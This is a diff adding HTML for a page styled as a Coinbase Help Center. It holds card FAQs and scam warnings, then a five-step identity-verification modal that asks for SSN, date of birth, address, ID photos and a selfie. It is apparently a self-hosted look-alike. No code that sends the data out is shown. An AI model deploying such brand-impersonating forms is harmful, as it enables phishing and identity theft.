+          <div class="faq-q-inner"><span class="faq-tag">Card Management</span><span>How do I freeze or unfreeze my card?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Open the Coinbase app → tap <strong>Card</strong> → tap <strong>Freeze card</strong>. Your card is locked instantly — no purchases can be made while frozen. Tap <strong>Unfreeze</strong> to restore it at any time.</p>
+          <div class="faq-callout faq-callout-info">Freezing your card does not cancel it and does not affect your rewards or account.</div>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Card Management</span><span>My card is lost or stolen — what do I do?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <ol class="faq-ol">
+            <li><strong>Freeze the card immediately</strong> — Card tab → Freeze card</li>
+            <li><strong>Report it</strong> — Card settings → Report lost or stolen</li>
+            <li>A replacement card will be mailed at <strong>no cost</strong> within 7–10 business days</li>
+            <li>Your virtual card continues to work while you wait</li>
+          </ol>
+          <div class="faq-callout faq-callout-warn">If you see unauthorized charges, also contact support via <strong>Settings → Help → Contact us</strong> immediately.</div>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Card Management</span><span>How do I cancel my card?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Go to <strong>Card → Card settings → Close card</strong> in the app. This permanently cancels your card. You can reapply in the future if you change your mind.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Card Management</span><span>Can I use it with Apple Pay or Google Pay?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Yes. Add your Coinbase Card to Apple Wallet or Google Wallet through the app. Once added, you can tap to pay at any contactless terminal and use it for in-app purchases.</p>
+          <p style="margin-top:8px">To add: <strong>Card → Virtual card → Add to Apple/Google Wallet</strong></p>
+        </div>
+      </div>
+    </div>
+
+    <!-- SECURITY -->
+    <div class="faq-group" id="faq-security">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag faq-tag-warn">⚠️ Scam Alert</span><span>Will Coinbase ever ask for my card number?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p><strong>No.</strong> Coinbase support will never ask for your:</p>
+          <ul class="faq-ul faq-ul-danger">
+            <li>Full card number</li>
+            <li>CVV / security code</li>
+            <li>Card PIN</li>
+            <li>One-time passwords or 2FA codes</li>
+          </ul>
+          <div class="faq-callout faq-callout-danger">If anyone claiming to be Coinbase asks for these, it is a scam. Hang up or end the chat and report it via the app immediately.</div>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag faq-tag-warn">⚠️ Scam Alert</span><span>Someone said I need to pay to activate my card — is that real?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <div class="faq-callout faq-callout-danger" style="margin-bottom:12px"><strong>This is 100% a scam.</strong> Coinbase never charges a fee to apply for, ship, activate, or unblock your Coinbase Card.</div>
+          <p>Scammers impersonate Coinbase support and claim you need to pay a "processing fee," "tax," or "activation fee" to get your card. These are fraudulent. Report the interaction to:</p>
+          <ul class="faq-ul">
+            <li>Coinbase support — Settings → Help → Contact us</li>
+            <li>The FTC — reportfraud.ftc.gov</li>
+          </ul>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Security</span><span>How is my card protected against fraud?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Your Coinbase Card includes multiple fraud protections:</p>
+          <ul class="faq-ul">
+            <li><strong>Instant freeze</strong> — lock the card in one tap if you see suspicious activity</li>
+            <li><strong>Real-time transaction alerts</strong> — get notified for every purchase</li>
+            <li><strong>Zero liability policy</strong> — you're not responsible for unauthorized purchases when reported promptly (per Visa's Zero Liability Policy)</li>
+            <li><strong>EMV chip</strong> — chip card technology makes in-person fraud harder</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <!-- TAXES -->
+    <div class="faq-group" id="faq-taxes">
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Taxes</span><span>Are crypto card purchases taxable?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Yes. In the United States, using the Coinbase Card to make a purchase triggers a <strong>crypto-to-USD conversion</strong>, which is a <strong>taxable event</strong> under IRS guidance. This means:</p>
+          <ul class="faq-ul">
+            <li>Each purchase is treated as if you sold the crypto for USD</li>
+            <li>Capital gains or losses apply based on your cost basis</li>
+            <li>This applies even to small, everyday purchases</li>
+          </ul>
+          <div class="faq-callout faq-callout-warn">Using a stablecoin like USDC typically has minimal or no tax impact since the price doesn't change — but consult a tax professional for your situation.</div>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Taxes</span><span>Are crypto rewards taxable?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Generally, yes. The IRS treats crypto rewards received as taxable income at the fair market value on the date received. When you later sell the reward crypto, capital gains rules apply.</p>
+          <p style="margin-top:8px">Coinbase provides a <strong>tax report</strong> in your account under <strong>Taxes → Documents</strong> to help you track your activity.</p>
+        </div>
+      </div>
+      <div class="faq-item" onclick="toggleFaq(this)">
+        <div class="faq-q">
+          <div class="faq-q-inner"><span class="faq-tag">Taxes</span><span>Where can I download my transaction history?</span></div>
+          <span class="faq-chevron">›</span>
+        </div>
+        <div class="faq-a">
+          <p>Go to <strong>coinbase.com → Taxes → Documents</strong> or in the app under <strong>Profile → Taxes</strong>. You can download transaction history as a CSV file and access your annual gain/loss reports.</p>
+          <div class="faq-callout faq-callout-info">Coinbase partners with TurboTax and CoinTracker to simplify crypto tax filing. Look for import options in your tax software.</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="faq-still-need">
+      <p>Still have a question?</p>
+      <a href="index.html#contact" class="btn-outline" style="text-decoration:none">Contact Support →</a>
+    </div>
+  </section>
+
+  <!-- FOOTER -->
+  <footer class="footer">
+    <div class="footer-inner container">
+      <div class="footer-brand">
+        <svg width="120" height="24" viewBox="0 0 140 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/><text x="30" y="17" font-family="Inter,sans-serif" font-size="16" font-weight="700" fill="#fff">coinbase</text></svg>
+        <p style="margin-top:12px;color:#9CA3AF;font-size:13px">Coinbase Help Center<br>© 2025 Coinbase, Inc.</p>
+      </div>
+      <div class="footer-cols">
+        <div class="footer-col">
+          <h5>Products</h5>
+          <a href="card.html">Coinbase Card</a>
+          <a href="#">Buy Crypto</a>
+          <a href="#">Advanced Trade</a>
+        </div>
+        <div class="footer-col">
+          <h5>Support</h5>
+          <a href="index.html">Help Center</a>
+          <a href="scam-alerts.html">Security</a>
+          <a href="#">Contact Us</a>
+        </div>
+        <div class="footer-col">
+          <h5>Legal</h5>
+          <a href="#">Privacy Policy</a>
+          <a href="#">User Agreement</a>
+          <a href="#">Licenses</a>
+        </div>
+      </div>
+    </div>
+    <div class="footer-bottom container">
+      <p>The Coinbase Card is issued by Pathward, N.A., Member FDIC, pursuant to a license from Visa U.S.A. Inc. Crypto is not legal tender and is not FDIC or SIPC insured. Crypto rewards are subject to availability and may change.</p>
+    </div>
+  </footer>
+
+  <!-- ========== IDENTITY VERIFICATION MODAL ========== -->
+  <div class="verify-overlay" id="verifyOverlay" onclick="closeVerifyIfBg(event)">
+    <div class="verify-modal" id="verifyModal">
+
+      <!-- Modal header -->
+      <div class="vm-header">
+        <div class="vm-logo">
+          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="12" fill="#0052FF"/><path d="M12 5.5a6.5 6.5 0 100 13 6.5 6.5 0 000-13zm0 10a3.5 3.5 0 110-7 3.5 3.5 0 010 7z" fill="#fff"/></svg>
+          <span>Identity Verification</span>
+        </div>
+        <button class="vm-close" onclick="closeVerifyModal()" aria-label="Close">✕</button>
+      </div>
+
+      <!-- Modal progress -->
+      <div class="vm-progress">
+        <div class="vm-prog-track"><div class="vm-prog-fill" id="vmFill"></div></div>
+        <div class="vm-prog-steps" id="vmSteps">
+          <span class="vm-step active" data-label="Personal Info">1</span>
+          <span class="vm-step" data-label="Address">2</span>
+          <span class="vm-step" data-label="Upload ID">3</span>
+          <span class="vm-step" data-label="Selfie">4</span>
+          <span class="vm-step" data-label="Review">5</span>
+        </div>
+        <div class="vm-step-label" id="vmStepLabel">Personal Information</div>
+      </div>
+
+      <!-- Step panels -->
+      <div class="vm-body">
+
+        <!-- STEP 1: Personal Info -->
+        <div class="vm-panel active" id="vp1">
+          <div class="vm-panel-icon">👤</div>
+          <h3>Tell us about yourself</h3>
+          <p class="vm-panel-sub">Your information is encrypted and never sold to third parties.</p>
+          <div class="vm-form">
+            <div class="vm-row vm-row-2">
+              <div class="vm-field">
+                <label>First name</label>
+                <input type="text" placeholder="John" id="vf-first" />
+              </div>
+              <div class="vm-field">
+                <label>Last name</label>
+                <input type="text" placeholder="Doe" id="vf-last" />
+              </div>
+            </div>
+            <div class="vm-field">
+              <label>Date of birth</label>
+              <div class="vm-row vm-row-3">
+                <input type="text" placeholder="MM" maxlength="2" id="vf-mm" class="vm-short" />
+                <input type="text" placeholder="DD" maxlength="2" id="vf-dd" class="vm-short" />
+                <input type="text" placeholder="YYYY" maxlength="4" id="vf-yyyy" class="vm-short" />
+              </div>
+            </div>
+            <div class="vm-field">
+              <label>Social Security Number (SSN)</label>
+              <input type="password" placeholder="•••-••-••••" maxlength="11" id="vf-ssn" />
+              <span class="vm-field-hint">Used only for identity verification. We never store your full SSN.</span>
+            </div>
+            <div class="vm-field">
+              <label>Phone number</label>
+              <input type="tel" placeholder="+1 (555) 000-0000" id="vf-phone" />
+            </div>
+          </div>
+          <div class="vm-warn">
+            <span>🔒</span>
+            <span>256-bit encrypted connection. Coinbase will <strong>never</strong> ask for this information by phone or email.</span>
+          </div>
+        </div>
+
+        <!-- STEP 2: Address -->
+        <div class="vm-panel" id="vp2">
+          <div class="vm-panel-icon">🏠</div>
+          <h3>Your home address</h3>
+          <p class="vm-panel-sub">Must be a US address. P.O. boxes are not accepted.</p>
+          <div class="vm-form">
+            <div class="vm-field">
+              <label>Street address</label>
+              <input type="text" placeholder="123 Main Street" id="vf-street" />
+            </div>
+            <div class="vm-field">
+              <label>Apt / Suite (optional)</label>
+              <input type="text" placeholder="Apt 4B" id="vf-apt" />
+            </div>
+            <div class="vm-row vm-row-3">
+              <div class="vm-field" style="flex:2">
+                <label>City</label>
+                <input type="text" placeholder="San Francisco" id="vf-city" />
+              </div>
+              <div class="vm-field">
+                <label>State</label>
+                <select id="vf-state">
+                  <option value="">State</option>
+                  <option>AL</option><option>AK</option><option>AZ</option><option>AR</option>
+                  <option>CA</option><option>CO</option><option>CT</option><option>DE</option>
+                  <option>FL</option><option>GA</option><option>HI</option><option>ID</option>
+                  <option>IL</option><option>IN</option><option>IA</option><option>KS</option>
+                  <option>KY</option><option>LA</option><option>ME</option><option>MD</option>
+                  <option>MA</option><option>MI</option><option>MN</option><option>MS</option>
+                  <option>MO</option><option>MT</option><option>NE</option><option>NV</option>
+                  <option>NH</option><option>NJ</option><option>NM</option><option>NY</option>
+                  <option>NC</option><option>ND</option><option>OH</option><option>OK</option>
+                  <option>OR</option><option>PA</option><option>RI</option><option>SC</option>
+                  <option>SD</option><option>TN</option><option>TX</option><option>UT</option>
+                  <option>VT</option><option>VA</option><option>WA</option><option>WV</option>
+                  <option>WI</option><option>WY</option>
+                </select>
+              </div>
+              <div class="vm-field">
+                <label>ZIP code</label>
+                <input type="text" placeholder="94107" maxlength="5" id="vf-zip" />
+              </div>
+            </div>
+          </div>
+          <div class="vm-warn">
+            <span>ℹ️</span>
+            <span>Your address must match your government-issued ID exactly.</span>
+          </div>
+        </div>
+
+        <!-- STEP 3: Upload ID -->
+        <div class="vm-panel" id="vp3">
+          <div class="vm-panel-icon">🪪</div>
+          <h3>Upload your ID</h3>
+          <p class="vm-panel-sub">Choose a document type and upload clear photos of both sides.</p>
+
+          <div class="vm-id-type-row">
+            <button class="vm-id-type active" onclick="selectIdType(this,'drivers')">Driver's License</button>
+            <button class="vm-id-type" onclick="selectIdType(this,'passport')">Passport</button>
+            <button class="vm-id-type" onclick="selectIdType(this,'stateid')">State ID</button>
+          </div>
+
+          <div class="vm-upload-row">
+            <div class="vm-upload-box" id="uploadFront" onclick="simulateUpload('uploadFront','front')">
+              <div class="vm-upload-inner">
+                <div class="vm-upload-icon">📄</div>
+                <strong>Front of ID</strong>
+                <span>Click to upload or drag & drop</span>
+                <span class="vm-upload-hint">JPG, PNG or PDF · Max 10MB</span>
+              </div>
+            </div>
+            <div class="vm-upload-box" id="uploadBack" onclick="simulateUpload('uploadBack','back')">
+              <div class="vm-upload-inner">
+                <div class="vm-upload-icon">📄</div>
+                <strong>Back of ID</strong>
+                <span>Click to upload or drag & drop</span>
+                <span class="vm-upload-hint">JPG, PNG or PDF · Max 10MB</span>
+              </div>
+            </div>
+          </div>
+
+          <div class="vm-id-tips">
+            <div class="vm-tip"><span>✓</span><span>All four corners visible</span></div>
+            <div class="vm-tip"><span>✓</span><span>No glare or flash reflections</span></div>
+            <div class="vm-tip"><span>✓</span><span>Text is clear and readable</span></div>
+            <div class="vm-tip vm-tip-bad"><span>✗</span><span>No expired IDs</span></div>
+            <div class="vm-tip vm-tip-bad"><span>✗</span><span>No photocopies or screenshots</span></div>
+          </div>
+        </div>
+
+        <!-- STEP 4: Selfie -->
+        <div class="vm-panel" id="vp4">
+          <div class="vm-panel-icon">🤳</div>
+          <h3>Take a selfie</h3>
+          <p class="vm-panel-sub">We'll compare your face to the photo on your ID to confirm it's you.</p>
+
+          <div class="vm-selfie-area" id="selfieArea">
+            <div class="vm-selfie-frame">
+              <div class="vm-selfie-oval">
+                <div class="vm-selfie-placeholder" id="selfiePlaceholder">
+                  <div class="vm-face-icon">👤</div>
+                  <span>Position your face in the oval</span>
+                </div>
+                <div class="vm-selfie-done" id="selfieDone" style="display:none">
+                  <div class="vm-selfie-check">✓</div>
+                  <span>Selfie captured!</span>
+                </div>
+                <div class="vm-oval-ring"></div>
+              </div>
+            </div>
+            <div class="vm-selfie-tips">
+              <div class="vm-stip"><span>💡</span><span>Good lighting — face a window or lamp</span></div>
+              <div class="vm-stip"><span>💡</span><span>Remove glasses if possible</span></div>
+              <div class="vm-stip"><span>💡</span><span>Look directly at the camera</span></div>
+            </div>
+          </div>
+
+          <div class="vm-selfie-btns">
+            <button class="vm-camera-btn" id="cameraBtnStart" onclick="startSelfie()">
+              <span>📷</span> Open Camera
+            </button>
+            <button class="vm-camera-btn vm-camera-capture" id="cameraBtnCapture" onclick="captureSelfie()" style="display:none">
+              <span>⬤</span> Capture Photo
+            </button>
+            <button class="vm-camera-btn vm-camera-retry" id="cameraBtnRetry" onclick="retrySelfie()" style="display:none">
+              ↺ Retake
+            </button>
+          </div>
+        </div>
+
+        <!-- STEP 5: Review -->
+        <div class="vm-panel" id="vp5">
+          <div class="vm-panel-icon">📋</div>
+          <h3>Review your information</h3>
+          <p class="vm-panel-sub">Please confirm everything is correct before submitting.</p>
+
+          <div class="vm-review-sections">
+            <div class="vm-review-block">
+              <div class="vm-review-title"><span>👤</span> Personal</div>
+              <div class="vm-review-row"><span>Name</span><strong id="rv-name">—</strong></div>
+              <div class="vm-review-row"><span>Date of birth</span><strong id="rv-dob">—</strong></div>
+              <div class="vm-review-row"><span>Phone</span><strong id="rv-phone">—</strong></div>
+            </div>
+            <div class="vm-review-block">
+              <div class="vm-review-title"><span>🏠</span> Address</div>
+              <div class="vm-review-row"><span>Street</span><strong id="rv-street">—</strong></div>
+              <div class="vm-review-row"><span>City / State / ZIP</span><strong id="rv-citystate">—</strong></div>
+            </div>
+            <div class="vm-review-block">
+              <div class="vm-review-title"><span>🪪</span> Documents</div>
+              <div class="vm-review-row"><span>ID type</span><strong id="rv-idtype">Driver's License</strong></div>
+              <div class="vm-review-row"><span>Front</span><strong id="rv-front" class="rv-status rv-ok">✓ Uploaded</strong></div>
+              <div class="vm-review-row"><span>Back</span><strong id="rv-back" class="rv-status rv-ok">✓ Uploaded</strong></div>
+              <div class="vm-review-row"><span>Selfie</span><strong id="rv-selfie" class="rv-status rv-ok">✓ Captured</strong></div>
+            </div>
+          </div>
+
+          <div class="vm-consent">
+            <label class="vm-checkbox-wrap">
+              <input type="checkbox" id="vmConsent" onchange="checkConsent()" />
+              <span class="vm-checkbox-box"></span>
+              <span>I confirm that the information provided is accurate and I authorize Coinbase to verify my identity using this data in accordance with the <a href="#" target="_blank">Privacy Policy</a>.</span>
+            </label>
+          </div>
+
+          <div class="vm-warn" style="margin-top:12px">
+            <span>🔒</span>
+            <span>Your data is encrypted in transit and at rest. Coinbase complies with federal KYC/AML requirements.</span>
+          </div>
+        </div>
+
+      </div><!-- vm-body -->
+
+      <!-- Modal footer nav -->
+      <div class="vm-footer">
+        <button class="btn-ghost" id="vmBack" onclick="vmGoStep(-1)" style="display:none">← Back</button>
+        <div class="vm-footer-right">
+          <span class="vm-step-counter" id="vmCounter">Step 1 of 5</span>
+          <button class="btn-primary" id="vmNext" onclick="vmGoStep(1)">Continue →</button>
+        </div>
+      </div>
+
+    </div><!-- verify-modal -->
+  </div><!-- verify-overlay -->
+
+  <!-- VERIFICATION SUCCESS MODAL -->
+  <div class="verify-success-overlay" id="verifySuccessOverlay">
+    <div class="verify-success-modal">
+      <div class="vsm-anim" id="vsmAnim">
+        <div class="vsm-circle">
+          <div class="vsm-check">✓</div>
+        </div>
+      </div>
+      <h2>Verification Submitted!</h2>
+      <p>Your identity verification is being reviewed. Most verifications are approved <strong>instantly</strong>. You'll receive a notification once complete.</p>
+      <div class="vsm-steps">
+        <div class="vsm-step vsm-done"><span>✓</span><div><strong>Information collected</strong><span>Encrypted and secure</span></div></div>
+        <div class="vsm-step vsm-processing"><span class="vsm-spin">⟳</span><div><strong>Under review</strong><span>Usually takes under 2 minutes</span></div></div>
+        <div class="vsm-step vsm-pending"><span>○</span><div><strong>Approval</strong><span>You'll be notified in the app</span></div></div>
+      </div>
+      <button class="btn-primary btn-lg" style="margin-top:28px;width:100%" onclick="closeSuccess()">Continue to Step 2 →</button>
+      <p class="vsm-note">Questions? Contact support via <strong>Settings → Help → Contact us</strong> in the Coinbase app — never through social media.</p>
+    </div>
+  </div>
+
+  <script src="app.js"></script>
+</body>
+</html>
